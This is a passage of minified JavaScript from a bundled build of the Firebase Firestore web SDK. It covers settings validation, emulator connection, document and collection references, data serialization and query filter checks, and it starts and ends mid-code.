t&&(t=t._delegate),!(t instanceof e)){if(e.name===t.constructor.name)throw new H(O.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const n=su(t);throw new H(O.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${n}`)}}return t}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class iy{constructor(e){var n,r;if(e.host===void 0){if(e.ssl!==void 0)throw new H(O.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host="firestore.googleapis.com",this.ssl=!0}else this.host=e.host,this.ssl=(n=e.ssl)===null||n===void 0||n;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=41943040;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<1048576)throw new H(O.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}BP("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=Mw((r=e.experimentalLongPollingOptions)!==null&&r!==void 0?r:{}),function(s){if(s.timeoutSeconds!==void 0){if(isNaN(s.timeoutSeconds))throw new H(O.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (must not be NaN)`);if(s.timeoutSeconds<5)throw new H(O.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (minimum allowed value is 5)`);if(s.timeoutSeconds>30)throw new H(O.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (maximum allowed value is 30)`)}}(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&function(r,i){return r.timeoutSeconds===i.timeoutSeconds}(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class ou{constructor(e,n,r,i){this._authCredentials=e,this._appCheckCredentials=n,this._databaseId=r,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new iy({}),this._settingsFrozen=!1,this._terminateTask="notTerminated"}get app(){if(!this._app)throw new H(O.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new H(O.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new iy(e),e.credentials!==void 0&&(this._authCredentials=function(r){if(!r)return new ox;switch(r.type){case"firstParty":return new cx(r.sessionIndex||"0",r.iamToken||null,r.authTokenFactory||null);case"provider":return r.client;default:throw new H(O.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(n){const r=ty.get(n);r&&(G("ComponentProvider","Removing Datastore"),ty.delete(n),r.terminate())}(this),Promise.resolve()}}function $P(t,e,n,r={}){var i;const s=(t=qt(t,ou))._getSettings(),o=`${e}:${n}`;if(s.host!=="firestore.googleapis.com"&&s.host!==o&&Di("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used."),t._setSettings(Object.assign(Object.assign({},s),{host:o,ssl:!1})),r.mockUserToken){let l,u;if(typeof r.mockUserToken=="string")l=r.mockUserToken,u=Xe.MOCK_USER;else{l=MA(r.mockUserToken,(i=t._app)===null||i===void 0?void 0:i.options.projectId);const h=r.mockUserToken.sub||r.mockUserToken.user_id;if(!h)throw new H(O.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");u=new Xe(h)}t._authCredentials=new ax(new b0(l,u))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ki{constructor(e,n,r){this.converter=n,this._query=r,this.type="query",this.firestore=e}withConverter(e){return new Ki(this.firestore,e,this._query)}}class ot{constructor(e,n,r){this.converter=n,this._key=r,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new ir(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new ot(this.firestore,e,this._key)}}class ir extends Ki{constructor(e,n,r){super(e,n,sf(r)),this._path=r,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new ot(this.firestore,null,new K(e))}withConverter(e){return new ir(this.firestore,e,this._path)}}function Uh(t,e,...n){if(t=at(t),Fw("collection","path",e),t instanceof ou){const r=ye.fromString(e,...n);return ry(r),new ir(t,null,r)}{if(!(t instanceof ot||t instanceof ir))throw new H(O.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=t._path.child(ye.fromString(e,...n));return ry(r),new ir(t.firestore,null,r)}}function jt(t,e,...n){if(t=at(t),arguments.length===1&&(e=V0.newId()),Fw("doc","path",e),t instanceof ou){const r=ye.fromString(e,...n);return ny(r),new ot(t,null,new K(r))}{if(!(t instanceof ot||t instanceof ir))throw new H(O.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=t._path.child(ye.fromString(e,...n));return ny(r),new ot(t.firestore,t instanceof ir?t.converter:null,new K(r))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sy{constructor(e=Promise.resolve()){this.Pu=[],this.Iu=!1,this.Tu=[],this.Eu=null,this.du=!1,this.Au=!1,this.Ru=[],this.t_=new mw(this,"async_queue_retry"),this.Vu=()=>{const r=vc();r&&G("AsyncQueue","Visibility state changed to "+r.visibilityState),this.t_.jo()},this.mu=e;const n=vc();n&&typeof n.addEventListener=="function"&&n.addEventListener("visibilitychange",this.Vu)}get isShuttingDown(){return this.Iu}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.fu(),this.gu(e)}enterRestrictedMode(e){if(!this.Iu){this.Iu=!0,this.Au=e||!1;const n=vc();n&&typeof n.removeEventListener=="function"&&n.removeEventListener("visibilitychange",this.Vu)}}enqueue(e){if(this.fu(),this.Iu)return new Promise(()=>{});const n=new yn;return this.gu(()=>this.Iu&&this.Au?Promise.resolve():(e().then(n.resolve,n.reject),n.promise)).then(()=>n.promise)}enqueueRetryable(e){this.enqueueAndForget(()=>(this.Pu.push(e),this.pu()))}async pu(){if(this.Pu.length!==0){try{await this.Pu[0](),this.Pu.shift(),this.t_.reset()}catch(e){if(!xo(e))throw e;G("AsyncQueue","Operation failed with retryable error: "+e)}this.Pu.length>0&&this.t_.Go(()=>this.pu())}}gu(e){const n=this.mu.then(()=>(this.du=!0,e().catch(r=>{this.Eu=r,this.du=!1;const i=function(o){let l=o.message||"";return o.stack&&(l=o.stack.includes(o.message)?o.stack:o.message+`
`+o.stack),l}(r);throw An("INTERNAL UNHANDLED ERROR: ",i),r}).then(r=>(this.du=!1,r))));return this.mu=n,n}enqueueAfterDelay(e,n,r){this.fu(),this.Ru.indexOf(e)>-1&&(n=0);const i=vf.createAndSchedule(this,e,n,r,s=>this.yu(s));return this.Tu.push(i),i}fu(){this.Eu&&X()}verifyOperationInProgress(){}async wu(){let e;do e=this.mu,await e;while(e!==this.mu)}Su(e){for(const n of this.Tu)if(n.timerId===e)return!0;return!1}bu(e){return this.wu().then(()=>{this.Tu.sort((n,r)=>n.targetTimeMs-r.targetTimeMs);for(const n of this.Tu)if(n.skipDelay(),e!=="all"&&n.timerId===e)break;return this.wu()})}Du(e){this.Ru.push(e)}yu(e){const n=this.Tu.indexOf(e);this.Tu.splice(n,1)}}class qr extends ou{constructor(e,n,r,i){super(e,n,r,i),this.type="firestore",this._queue=new sy,this._persistenceKey=(i==null?void 0:i.name)||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new sy(e),this._firestoreClient=void 0,await e}}}function WP(t,e){const n=typeof t=="object"?t:H_(),r=typeof t=="string"?t:"(default)",i=jd(n,"firestore").getImmediate({identifier:r});if(!i._initialized){const s=OA("firestore");s&&$P(i,...s)}return i}function Tf(t){if(t._terminated)throw new H(O.FAILED_PRECONDITION,"The client has already been terminated.");return t._firestoreClient||qP(t),t._firestoreClient}function qP(t){var e,n,r;const i=t._freezeSettings(),s=function(l,u,h,f){return new Ix(l,u,h,f.host,f.ssl,f.experimentalForceLongPolling,f.experimentalAutoDetectLongPolling,Mw(f.experimentalLongPollingOptions),f.useFetchStreams)}(t._databaseId,((e=t._app)===null||e===void 0?void 0:e.options.appId)||"",t._persistenceKey,i);t._componentsProvider||!((n=i.localCache)===null||n===void 0)&&n._offlineComponentProvider&&(!((r=i.localCache)===null||r===void 0)&&r._onlineComponentProvider)&&(t._componentsProvider={_offline:i.localCache._offlineComponentProvider,_online:i.localCache._onlineComponentProvider}),t._firestoreClient=new MP(t._authCredentials,t._appCheckCredentials,t._queue,s,t._componentsProvider&&function(l){const u=l==null?void 0:l._online.build();return{_offline:l==null?void 0:l._offline.build(u),_online:u}}(t._componentsProvider))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fi{constructor(e){this._byteString=e}static fromBase64String(e){try{return new Fi(We.fromBase64String(e))}catch(n){throw new H(O.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+n)}}static fromUint8Array(e){return new Fi(We.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class au{constructor(...e){for(let n=0;n<e.length;++n)if(e[n].length===0)throw new H(O.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new je(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class If{constructor(e){this._methodName=e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sf{constructor(e,n){if(!isFinite(e)||e<-90||e>90)throw new H(O.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(n)||n<-180||n>180)throw new H(O.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+n);this._lat=e,this._long=n}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return le(this._lat,e._lat)||le(this._long,e._long)}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Af{constructor(e){this._values=(e||[]).map(n=>n)}toArray(){return this._values.map(e=>e)}isEqual(e){return function(r,i){if(r.length!==i.length)return!1;for(let s=0;s<r.length;++s)if(r[s]!==i[s])return!1;return!0}(this._values,e._values)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const HP=/^__.*__$/;class GP{constructor(e,n,r){this.data=e,this.fieldMask=n,this.fieldTransforms=r}toMutation(e,n){return this.fieldMask!==null?new fr(e,this.data,this.fieldMask,n,this.fieldTransforms):new Po(e,this.data,n,this.fieldTransforms)}}class Uw{constructor(e,n,r){this.data=e,this.fieldMask=n,this.fieldTransforms=r}toMutation(e,n){return new fr(e,this.data,this.fieldMask,n,this.fieldTransforms)}}function jw(t){switch(t){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw X()}}class Cf{constructor(e,n,r,i,s,o){this.settings=e,this.databaseId=n,this.serializer=r,this.ignoreUndefinedProperties=i,s===void 0&&this.vu(),this.fieldTransforms=s||[],this.fieldMask=o||[]}get path(){return this.settings.path}get Cu(){return this.settings.Cu}Fu(e){return new Cf(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}Mu(e){var n;const r=(n=this.path)===null||n===void 0?void 0:n.child(e),i=this.Fu({path:r,xu:!1});return i.Ou(e),i}Nu(e){var n;const r=(n=this.path)===null||n===void 0?void 0:n.child(e),i=this.Fu({path:r,xu:!1});return i.vu(),i}Lu(e){return this.Fu({path:void 0,xu:!0})}Bu(e){return kl(e,this.settings.methodName,this.settings.ku||!1,this.path,this.settings.qu)}contains(e){return this.fieldMask.find(n=>e.isPrefixOf(n))!==void 0||this.fieldTransforms.find(n=>e.isPrefixOf(n.field))!==void 0}vu(){if(this.path)for(let e=0;e<this.path.length;e++)this.Ou(this.path.get(e))}Ou(e){if(e.length===0)throw this.Bu("Document fields must not be empty");if(jw(this.Cu)&&HP.test(e))throw this.Bu('Document fields cannot begin and end with "__"')}}class KP{constructor(e,n,r){this.databaseId=e,this.ignoreUndefinedProperties=n,this.serializer=r||nu(e)}Qu(e,n,r,i=!1){return new Cf({Cu:e,methodName:n,qu:r,path:je.emptyPath(),xu:!1,ku:i},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function lu(t){const e=t._freezeSettings(),n=nu(t._databaseId);return new KP(t._databaseId,!!e.ignoreUndefinedProperties,n)}function zw(t,e,n,r,i,s={}){const o=t.Qu(s.merge||s.mergeFields?2:0,e,n,i);Rf("Data must be an object, but it was:",o,r);const l=Bw(r,o);let u,h;if(s.merge)u=new Et(o.fieldMask),h=o.fieldTransforms;else if(s.mergeFields){const f=[];for(const p of s.mergeFields){const g=jh(e,p,n);if(!o.contains(g))throw new H(O.INVALID_ARGUMENT,`Field '${g}' is specified in your field mask but missing from your input data.`);Ww(f,g)||f.push(g)}u=new Et(f),h=o.fieldTransforms.filter(p=>u.covers(p.field))}else u=null,h=o.fieldTransforms;return new GP(new dt(l),u,h)}class uu extends If{_toFieldTransform(e){if(e.Cu!==2)throw e.Cu===1?e.Bu(`${this._methodName}() can only appear at the top level of your update data`):e.Bu(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof uu}}function QP(t,e,n,r){const i=t.Qu(1,e,n);Rf("Data must be an object, but it was:",i,r);const s=[],o=dt.empty();$r(r,(u,h)=>{const f=xf(e,u,n);h=at(h);const p=i.Nu(f);if(h instanceof uu)s.push(f);else{const g=Vo(h,p);g!=null&&(s.push(f),o.set(f,g))}});const l=new Et(s);return new Uw(o,l,i.fieldTransforms)}function YP(t,e,n,r,i,s){const o=t.Qu(1,e,n),l=[jh(e,r,n)],u=[i];if(s.length%2!=0)throw new H(O.INVALID_ARGUMENT,`Function ${e}() needs to be called with an even number of arguments that alternate between field names and values.`);for(let g=0;g<s.length;g+=2)l.push(jh(e,s[g])),u.push(s[g+1]);const h=[],f=dt.empty();for(let g=l.length-1;g>=0;--g)if(!Ww(h,l[g])){const v=l[g];let A=u[g];A=at(A);const k=o.Nu(v);if(A instanceof uu)h.push(v);else{const N=Vo(A,k);N!=null&&(h.push(v),f.set(v,N))}}const p=new Et(h);return new Uw(f,p,o.fieldTransforms)}function XP(t,e,n,r=!1){return Vo(n,t.Qu(r?4:3,e))}function Vo(t,e){if($w(t=at(t)))return Rf("Unsupported field value:",e,t),Bw(t,e);if(t instanceof If)return function(r,i){if(!jw(i.Cu))throw i.Bu(`${r._methodName}() can only be used with update() and set()`);if(!i.path)throw i.Bu(`${r._methodName}() is not currently supported inside arrays`);const s=r._toFieldTransform(i);s&&i.fieldTransforms.push(s)}(t,e),null;if(t===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),t instanceof Array){if(e.settings.xu&&e.Cu!==4)throw e.Bu("Nested arrays are not supported");return function(r,i){const s=[];let o=0;for(const l of r){let u=Vo(l,i.Lu(o));u==null&&(u={nullValue:"NULL_VALUE"}),s.push(u),o++}return{arrayValue:{values:s}}}(t,e)}return function(r,i){if((r=at(r))===null)return{nullValue:"NULL_VALUE"};if(typeof r=="number")return qx(i.serializer,r);if(typeof r=="boolean")return{booleanValue:r};if(typeof r=="string")return{stringValue:r};if(r instanceof Date){const s=pe.fromDate(r);return{timestampValue:Cl(i.serializer,s)}}if(r instanceof pe){const s=new pe(r.seconds,1e3*Math.floor(r.nanoseconds/1e3));return{timestampValue:Cl(i.serializer,s)}}if(r instanceof Sf)return{geoPointValue:{latitude:r.latitude,longitude:r.longitude}};if(r instanceof Fi)return{bytesValue:ow(i.serializer,r._byteString)};if(r instanceof ot){const s=i.databaseId,o=r.firestore._databaseId;if(!o.isEqual(s))throw i.Bu(`Document reference is for database ${o.projectId}/${o.database} but should be for database ${s.projectId}/${s.database}`);return{referenceValue:cf(r.firestore._databaseId||i.databaseId,r._key.path)}}if(r instanceof Af)return function(o,l){return{mapValue:{fields:{__type__:{stringValue:"__vector__"},value:{arrayValue:{values:o.toArray().map(u=>{if(typeof u!="number")throw l.Bu("VectorValues must only contain numeric values.");return of(l.serializer,u)})}}}}}}(r,i);throw i.Bu(`Unsupported field value: ${su(r)}`)}(t,e)}function Bw(t,e){const n={};return O0(t)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):$r(t,(r,i)=>{const s=Vo(i,e.Mu(r));s!=null&&(n[r]=s)}),{mapValue:{fields:n}}}function $w(t){return!(typeof t!="object"||t===null||t instanceof Array||t instanceof Date||t instanceof pe||t instanceof Sf||t instanceof Fi||t instanceof ot||t instanceof If||t instanceof Af)}function Rf(t,e,n){if(!$w(n)||!function(i){return typeof i=="object"&&i!==null&&(Object.getPrototypeOf(i)===Object.prototype||Object.getPrototypeOf(i)===null)}(n)){const r=su(n);throw r==="an object"?e.Bu(t+" a custom object"):e.Bu(t+" "+r)}}function jh(t,e,n){if((e=at(e))instanceof au)return e._internalPath;if(typeof e=="string")return xf(t,e);throw kl("Field path arguments must be of type string or ",t,!1,void 0,n)}const JP=new RegExp("[~\\*/\\[\\]]");function xf(t,e,n){if(e.search(JP)>=0)throw kl(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,t,!1,void 0,n);try{return new au(...e.split("."))._internalPath}catch{throw kl(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,t,!1,void 0,n)}}function kl(t,e,n,r,i){const s=r&&!r.isEmpty(),o=i!==void 0;let l=`Function ${e}() called with invalid data`;n&&(l+=" (via `toFirestore()`)"),l+=". ";let u="";return(s||o)&&(u+=" (found",s&&(u+=` in field ${r}`),o&&(u+=` in document ${i}`),u+=")"),new H(O.INVALID_ARGUMENT,l+t+u)}function Ww(t,e){return t.some(n=>n.isEqual(e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class qw{constructor(e,n,r,i,s){this._firestore=e,this._userDataWriter=n,this._key=r,this._document=i,this._converter=s}get id(){return this._key.path.lastSegment()}get ref(){return new ot(this._firestore,this._converter,this._key)}exists(){return this._document!==null}data(){if(this._document){if(this._converter){const e=new ZP(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){const n=this._document.data.field(kf("DocumentSnapshot.get",e));if(n!==null)return this._userDataWriter.convertValue(n)}}}class ZP extends qw{data(){return super.data()}}function kf(t,e){return typeof e=="string"?xf(t,e):e instanceof au?e._internalPath:e._delegate._internalPath}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function eN(t){if(t.limitType==="L"&&t.explicitOrderBy.length===0)throw new H(O.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class Pf{}class tN extends Pf{}function nN(t,e,...n){let r=[];e instanceof Pf&&r.push(e),r=r.concat(n),function(s){const o=s.filter(u=>u instanceof Nf).length,l=s.filter(u=>u instanceof cu).length;if(o>1||o>0&&l>0)throw new H(O.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")}(r);for(const i of r)t=i._apply(t);return t}class cu extends tN{constructor(e,n,r){super(),this._field=e,this._op=n,this._value=r,this.type="where"}static _create(e,n,r){return new cu(e,n,r)}_apply(e){const n=this._parse(e);return Hw(e._query,n),new Ki(e.firestore,e.converter,kh(e._query,n))}_parse(e){const n=lu(e.firestore);return function(s,o,l,u,h,f,p){let g;if(h.isKeyField()){if(f==="array-contains"||f==="array-contains-any")throw new H(O.INVALID_ARGUMENT,`Invalid Query. You can't perform '${f}' queries on documentId().`);if(f==="in"||f==="not-in"){ay(p,f);const v=[];for(const A of p)v.push(oy(u,s,A));g={arrayValue:{values:v}}}else g=oy(u,s,p)}else f!=="in"&&f!=="not-in"&&f!=="array-contains-any"||ay(p,f),g=XP(l,o,p,f==="in"||f==="not-in");return Pe.create(h,f,g)}(e._query,"where",n,e.firestore._databaseId,this._field,this._op,this._value)}}function rN(t,e,n){const r=e,i=kf("where",t);return cu._create(i,r,n)}class Nf extends Pf{constructor(e,n){super(),this.type=e,this._queryConstraints=n}static _create(e,n){return new Nf(e,n)}_parse(e){const n=this._queryConstraints.map(r=>r._parse(e)).filter(r=>r.getFilters().length>0);return n.length===1?n[0]:Wt.create(n,this._getOperator())}_apply(e){const n=this._parse(e);return n.getFilters().length===0?e:(function(i,s){let o=i;const l=s.getFlattenedFilters();for(const u of l)Hw(o,u),o=kh(o,u)}(e._query,n),new Ki(e.firestore,e.converter,kh(e._query,n)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return this.type==="and"?"and":"or"}}function oy(t,e,n){if(typeof(n=at(n))=="string"){if(n==="")throw new H(O.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!W0(e)&&n.indexOf("/")!==-1)throw new H(O.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${n}' contains a '/' character.`);const r=e.path.child(ye.fromString(n));if(!K.isDocumentKey(r))throw new H(O.INVALID_ARGUMENT,`Invalid query. When querying a collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return xg(t,new K(r))}if(n instanceof ot)return xg(t,n._key);throw new H(O.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${su(n)}.`)}function ay(t,e){if(!Array.isArray(t)||t.length===0)throw new H(O.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${e.toString()}' filters.`)}function Hw(t,e){const n=function(i,s){for(const o of i)for(const l of o.getFlattenedFilters())if(s.indexOf(l.op)>=0)return l.op;return null}(t.filters,function(i){switch(i){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}}(e.op));if(n!==null)throw n===e.op?new H(O.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${e.op.toString()}' filter.`):new H(O.INVALID_ARGUMENT,`Invalid query. You cannot use '${e.op.toString()}' filters with '${n.toString()}' filters.`)}class iN{convertValue(e,n="none"){switch(Ur(e)){case 0:return null;case 1:return e.booleanValue;case 2:return Ce(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,n);case 5:return e.stringValue;case 6:return this.convertBytes(Fr(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,n);case 11:return this.convertObject(e.mapValue,n);case 10:return this.convertVectorValue(e.mapValue);default:throw X()}}convertObject(e,n){return this.convertObjectMap(e.fields,n)}convertObjectMap(e,n="none"){const r={};return $r(e,(i,s)=>{r[i]=this.convertValue(s,n)}),r}convertVectorValue(e){var n,r,i;const s=(i=(r=(n=e.fields)===null||n===void 0?void 0:n.value.arrayValue)===null||r===void 0?void 0:r.values)===null||i===void 0?void 0:i.map(o=>Ce(o.doubleValue));return new Af(s)}convertGeoPoint(e){return new Sf(Ce(e.latitude),Ce(e.longitude))}convertArray(e,n){return(e.values||[]).map(r=>this.convertValue(r,n))}convertServerTimestamp(e,n){switch(n){case"previous":const r=ef(e);return r==null?null:this.convertValue(r,n);case"estimate":return this.convertTimestamp(uo(e));default:return null}}convertTimestamp(e){const n=lr(e);return new pe(n.seconds,n.nanos)}convertDocumentKey(e,n){const r=ye.fromString(e);ce(dw(r));const i=new co(r.get(1),r.get(3)),s=new K(r.popFirst(5));return 